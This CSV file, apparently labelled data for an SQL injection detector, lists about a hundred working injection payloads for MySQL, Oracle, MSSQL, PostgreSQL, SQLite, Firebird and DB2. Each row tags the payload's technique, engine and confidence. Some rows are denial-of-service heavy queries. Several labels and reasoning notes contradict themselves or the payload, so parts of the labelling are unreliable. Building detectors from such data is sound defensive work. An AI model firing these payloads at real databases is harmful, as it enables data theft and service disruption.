id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23158,"1%"" ) ) ) union all select null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23159,1' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.70,"Pattern match: 'rlike (' → boolean_blind (P3); mysql database; sources disagree (A says boolean vs C heuristic)",1
23160,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23161,"-7007 ) union all select 6704,6704--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23162,1' ) ) as uizu where 1774 = 1774,boolean_blind,generic,0.70,"generic SQL structure without strong signal; boolean condition equality test; rule-check heuristic only",1
23163,"1'|| ( select 'eamo' where 4958 = 4958 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) ||'",time_blind,oracle,0.90,"Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); both A and C sources agree on Oracle signature",2
23164,"1%' ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( '%' = '",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird system enumeration (rdb$fields, rdb$types, rdb$collations)",1
23165,-2715' ) ) or 6942 = 1636 and ( ( 'mqeq' = 'mqeq,boolean_blind,generic,0.70,"Pattern match: 'or 6942 = 1636' → boolean_blind (P3); equality comparison in OR clause; generic DB",1
23166,"-3378%"" ) ) union all select 9357,9357,9357,9357,9357--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23167,"-6263%"" ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""%"" = """,boolean_blind,oracle,0.50,"generic SQL keywords without specific signal; Oracle signature (dual); sources disagree on classification",0
23168,waitfor delay '0:0:5' ) +',time_blind,mssql,0.90,"Pattern match: 'waitfor delay' → time_blind (P5); both A and C sources agree on type and DB: MSSQL",2
23169,"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""gxhz"" = ""gxhz",error_based,oracle,0.90,"Pattern match: 'ctxsys.drithsx' → error_based (P4); both A and C sources confirm Oracle error-based injection",2
23170,-4882' order by 1#,benign,generic,0.50,"no attack signal detected; simple order by clause without injection context; lacks malicious pattern",0
23171,1 where 2301 = 2301,boolean_blind,generic,0.70,"generic SQL structure without strong signal; simple equality condition; insufficient injection evidence",1
23172,-9005 union all select 4410#,union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23173,"-7324 ) or make_set ( 8486 = 6544,6544 )",boolean_blind,mysql,0.50,"generic SQL keywords without specific signal; sources disagree (A says boolean vs C says benign); MySQL detected",0
23174,1' or sleep ( 5 ) and 'udqz' = 'udqz,time_blind,mysql,0.70,"Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql; sources disagree on A/C classification",1
23175,"1%"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""%"" = """,boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says error vs C says boolean)",1
23176,"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""qyew"" = ""qyew",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; Oracle table enumeration (all_users); sources disagree",1
23177,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) #",heavy_query,postgresql,0.70,"contains 7+ digit number (DoS-style payload); postgresql signature detected; heavy query DoS pattern evident",1
23178,"1"" ) where 3084 = 3084 union all select null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23179,"-4993"" union all select 6959,6959,6959--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB signature",2
23180,"end and ( ( ""dmgj"" = ""dmgj",benign,generic,0.50,"no SQLi signal in heuristic check; SQL keyword fragment without injection context; insufficient evidence",0
23181,"1' ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.90,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); both A and C sources agree on detection",2
23182,1 ) where 8813 = 8813,boolean_blind,generic,0.70,"generic SQL structure without strong signal; simple where clause with equality; no specific injection signal",1
23183,1' ) ) and sleep ( 5 ) #,time_blind,mysql,0.90,"Pattern match: 'sleep (' → time_blind (P5); both A and C sources confirm MySQL time-based blind SQLi",2
23184,( 8266 = 8266 ) *9900,benign,generic,0.50,"no attack signal detected; arithmetic expression without injection context; lacks malicious pattern",0
23185,"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",boolean_blind,generic,0.90,"Pattern match: 'and 7533 = 7533' → boolean_blind (P3); both A and C sources agree on type and DB",2
23186,"1 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) -- sbvl",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says error vs C says boolean)",1
23187,select ( case when ( 1227 = 4014 ) then 1227 else 1227* ( select 1227 from mysql.db ) end ) #,boolean_blind,mysql,0.70,"generic SQL structure without strong signal; boolean branching via case/when; MySQL detected",1
23188,1' ) as dqgr where 2427 = 2427 and ( 3020 = 3020 ) *6703--,boolean_blind,generic,0.70,"generic SQL structure without strong signal; boolean aliased subquery with arithmetic; generic DB",1
23189,"1"" where 4445 = 4445 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",error_based,mysql,0.70,"Pattern match: 'extractvalue (' → error_based (P4); MySQL signature; DoS-style heavy query pattern evident",1
23190,"1%"" ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ""%"" = """,boolean_blind,mysql,0.50,"generic SQL keywords without specific signal; sources disagree (A says boolean vs C says benign); MySQL DB",0
23191,"-8894%"" ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""%"" = """,error_based,oracle,0.90,"Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); both A and C confirm Oracle signature",2
23192,"-3438"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""nxiv"" = ""nxiv",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; sources disagree (A says boolean vs C says boolean)",1
23193,-7901 ) order by 1--,benign,generic,0.50,"no attack signal detected; simple order by without injection context; lacks malicious evidence",0
23194,1%' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.70,"Pattern match: 'rlike (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23195,"1' ) where 6489 = 6489 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says error vs C says boolean)",1
23196,"1"" ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird system enumeration (rdb$ prefix); sources disagree",1
23197,"-3261"" ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""yxms"" = ""yxms",error_based,oracle,0.90,"Pattern match: 'ctxsys.drithsx' → error_based (P4); both A and C sources confirm Oracle signature",2
23198,1 where 7464 = 7464 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --,boolean_blind,mysql,0.70,"Pattern match: 'rlike (' → boolean_blind (P3); MySQL signature; sources disagree on classification",1
23199,"1 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) # vojr",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says error vs C says boolean)",1
23200,"1' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'ckfn' like 'ckfn",heavy_query,sqlite,0.70,"contains 7+ digit number (DoS-style payload); Pattern match: 'randomblob (' → SQLite time-based pattern",1
23201,1'|| ( select 'uedy' where 8816 = 8816,boolean_blind,generic,0.70,"generic SQL structure without strong signal; simple equality test with select; insufficient injection evidence",1
23202,"1' in boolean mode ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) #",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; MSSQL system enumeration (sysusers); sources disagree",1
23203,-7951' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'blak' = 'blak,boolean_blind,generic,0.70,"generic SQL keywords without specific signal; MSSQL char concatenation pattern detected",1
23204,"1' ) ) as ylyq where 2953 = 2953 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; MSSQL system enumeration (sysusers); sources disagree",1
23205,"-4736' ) ) or elt ( 5835 = 5509,5509 ) and ( ( 'iawg' = 'iawg",boolean_blind,mysql,0.50,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says boolean vs C says benign)",0
23206,"-5438"" ) union all select 3170,3170--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23207,"-1368 ) ) union all select 1310,1310,1310,1310,1310#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23208,"-1550' in boolean mode ) union all select 9777,9777,9777--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23209,"1'+ ( select 'mxei' where 7811 = 7811 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.70,"contains 7+ digit number (DoS-style payload); PostgreSQL regex pattern; sources disagree on classification",1
23210,1 where 4372 = 4372,boolean_blind,generic,0.70,"generic SQL structure without strong signal; simple equality in where clause; no specific injection signal",1
23211,"-8797"" ) ) order by 1#",benign,generic,0.50,"no SQLi signal in heuristic check; simple order by without injection context; lacks malicious pattern",0
23212,"-9166"" ) as hlre where 4768 = 4768 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird case/when pattern with rdb$database; sources disagree",1
23213,1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,mysql,0.70,"Pattern match: 'sleep (' → time_blind (P5); MySQL signature; sources disagree on classification",1
23214,"1' where 2964 = 2964 union all select null,null,null#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23215,"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.90,"Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); both A and C confirm Oracle signature",2
23216,"1' ) ) and elt ( 4460 = 2665,2665 ) and ( ( 'qmzu' = 'qmzu",boolean_blind,mysql,0.50,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says boolean vs C says benign)",0
23217,"-1256' in boolean mode ) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23218,select pg_sleep ( 5 ) and ( ( 'rnzp' = 'rnzp,time_blind,postgresql,0.70,"Pattern match: 'pg_sleep (' → time_blind (P5); PostgreSQL signature; sources disagree on classification",1
23219,"1"" ) as vzdq where 3160 = 3160",boolean_blind,generic,0.70,"generic SQL structure without strong signal; simple where clause with equality; no specific injection signal",1
23220,"1"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""mjkl"" = ""mjkl",boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird case/when pattern with rdb$database; sources disagree",1
23221,"1"" ) ) order by 1#",benign,generic,0.50,"no SQLi signal in heuristic check; simple order by without injection context; lacks malicious pattern",0
23222,1' and 4595 = 4595#,boolean_blind,generic,0.90,"Pattern match: 'and 4595 = 4595' → boolean_blind (P3); both A and C sources agree on type and DB",2
23223,"-4015'|| ( select 'qeqv' from dual where 1437 = 1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",union_based,oracle,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources confirm Oracle signature",2
23224,"-7418 union all select 1340,1340,1340,1340,1340#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23225,1' ) where 6222 = 6222 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,0.70,"Pattern match: 'sleep (' → time_blind (P5); MySQL signature; sources disagree on classification",1
23226,"1"" ) where 7957 = 7957 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.70,"contains 7+ digit number (DoS-style payload); Pattern match: 'randomblob (' → SQLite time-based DoS",1
23227,"-1235"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""ahhz"" like ""ahhz",error_based,oracle,0.90,"Pattern match: 'xmltype (' → error_based (P4); both A and C sources confirm Oracle signature",2
23228,"1'+ ( select niht where 7294 = 7294 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; domain system enumeration; sources disagree on classification",1
23229,"1' ) ) as tgso where 1349 = 1349 union all select null,null,null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23230,"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'lwlh' = 'lwlh",boolean_blind,mysql,0.70,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says error vs C says boolean)",1
23231,"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""ccuy"" = ""ccuy",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; Oracle table enumeration (all_users); sources disagree",1
23232,"1"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""znzb"" like ""znzb",heavy_query,mysql,0.70,"contains 7+ digit number (DoS-style payload); PostgreSQL signature in sources; sources disagree",1
23233,1' ) where 8142 = 8142 waitfor delay '0:0:5'--,time_blind,mssql,0.90,"Pattern match: 'waitfor delay' → time_blind (P5); both A and C sources confirm MSSQL signature",2
23234,"-1275"" union all select 7861,7861,7861,7861,7861#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23235,"1"" ) ) ) and elt ( 2421 = 9612,9612 ) and ( ( ( ""gbdx"" like ""gbdx",boolean_blind,mysql,0.50,"Pattern match: 'elt (' → boolean_blind (P3); MySQL signature; sources disagree (A says boolean vs C says benign)",0
23236,"1%' ) ) union all select null,null,null,null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23237,select ( case when ( 9376 = 4521 ) then 1 else 9376* ( select 9376 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.70,"generic SQL keywords without specific signal; MSSQL master database pattern; sources disagree",1
23238,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'atyf' = 'atyf",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; domain system enumeration; sources disagree on classification",1
23239,"-6770' ) ) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23240,"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # miji",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; domain system enumeration; sources disagree on classification",1
23241,1' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'ajka' = 'ajka,error_based,oracle,0.90,"Pattern match: 'xmltype (' → error_based (P4); both A and C sources confirm Oracle signature",2
23242,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",boolean_blind,generic,0.70,"generic SQL keywords without specific signal; Oracle table enumeration (all_users); sources disagree",1
23243,"1'+ ( select bptu where 7356 = 7356 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",heavy_query,generic,0.70,"contains 7+ digit number (DoS-style payload); PostgreSQL signature in sources; sources disagree",1
23244,"1%' ) union all select null,null,null,null,null,null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23245,end-- elvi,benign,generic,0.50,"no attack signal detected; SQL keyword fragment without injection context; insufficient evidence",0
23246,"-6987' union all select 4721,4721--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23247,"-5360' where 8178 = 8178 union all select 8178,8178,8178--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23248,"1"" and ( 3020 = 3020 ) *6703 and ""tnzp"" like ""tnzp",benign,generic,0.50,"no SQLi signal in heuristic check; arithmetic expression with like clause; sources disagree (A says union vs C says benign)",0
23249,"-8875"" ) where 8428 = 8428 or 1519 = 5756--",boolean_blind,generic,0.70,"Pattern match: 'or 1519 = 5756' → boolean_blind (P3); generic DB; sources disagree on type classification",1
23250,1 ) ) as xzcl where 2332 = 2332,benign,generic,0.50,"no attack signal detected; simple aliased where clause without injection; sources disagree (A says union vs C says boolean)",0
23251,1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'rgyc' = 'rgyc,boolean_blind,firebird,0.70,"generic SQL keywords without specific signal; Firebird case/when pattern with rdb$database; sources disagree",1
23252,"-5520"" ) ) as utqk where 7762 = 7762 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.90,"Pattern match: 'ctxsys.drithsx' → error_based (P4); both A and C sources confirm Oracle signature",2
23253,"1'|| ( select 'wcad' from dual where 4262 = 4262 and elt ( 3114 = 3114,sleep ( 5 ) ) #",boolean_blind,oracle,0.70,"Pattern match: 'elt (' → boolean_blind (P3); Oracle signature; sources disagree on classification",1
23254,-9771' or 5113 = 5365,boolean_blind,generic,0.90,"Pattern match: 'or 5113 = 5365' → boolean_blind (P3); both A and C sources agree on type and DB",2
23255,"1', ( select ( case when ( 7734 = 7734 ) then ( select benchmark ( 5000000,md5 ( 0x72747341 ) ) ) else 7734* ( select 7734 from mysql.db ) end ) )",time_blind,mysql,0.70,"Pattern match: 'benchmark (' → time_blind (P5); MySQL signature; sources disagree on classification",1
23256,"1', ( select ( case when ( 7711 = 7711 ) then 1 else 7711* ( select 7711 from information_schema.character_sets ) end ) )",boolean_blind,mysql,0.70,"generic SQL keywords without specific signal; boolean branching via case/when; MySQL detected",1
23257,"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23258,-4965 ) as imga where 3705 = 3705 union all select 3705--,union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23259,"1%' ) union all select null,null,null,null--",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
23260,"1 ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 3366 = 3366",heavy_query,mysql,0.70,"contains 7+ digit number (DoS-style payload); PostgreSQL signature mismatch; sources disagree on classification",1
23261,"1"" ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""uglh"" like ""uglh",boolean_blind,db2,0.70,"generic SQL keywords without specific signal; DB2 system enumeration (sysibm.systables); sources disagree",1
23262,"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",heavy_query,generic,0.70,"contains 7+ digit number (DoS-style payload); PostgreSQL signature; sources disagree on classification",1
23263,"-2790' ) as xhct where 5756 = 5756 union all select 5756,5756#",union_based,generic,0.90,"Pattern match: 'union all select' → union_based (P7); both A and C sources agree on type and DB",2
